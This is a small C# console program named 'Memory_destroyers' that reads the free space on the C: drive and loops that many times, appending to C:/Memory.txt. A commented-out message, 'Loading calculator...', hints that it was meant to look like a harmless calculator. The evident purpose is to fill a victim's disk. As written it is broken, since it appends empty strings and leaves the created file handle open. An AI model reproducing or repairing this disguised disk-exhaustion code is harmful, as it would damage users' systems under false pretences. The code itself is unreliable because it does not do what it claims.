using System;
using System.IO;

namespace Memory_destroyers
{
    class Program
    {
        // static DriveInfo di = new DriveInfo("c");
        static long memory = new DriveInfo("c").TotalFreeSpace/1000;
        static void Main(string[] args)
        {
            if (!File.Exists("C:/Memory.txt"))
            {
                File.Create("C:/Memory.txt");
            }
            for (var i = 0; i < /* 1000001 */memory + 1; i++)
            {
                // Console.Clear();
                // Console.WriteLine("Загрузка калькулятора...");
                Console.WriteLine("" + Convert.ToString(i) + "/" + Convert.ToString(/* 1000000 */memory));
                File.AppendAllText("C:/Memory.txt", "");
            }
        }
    }
}
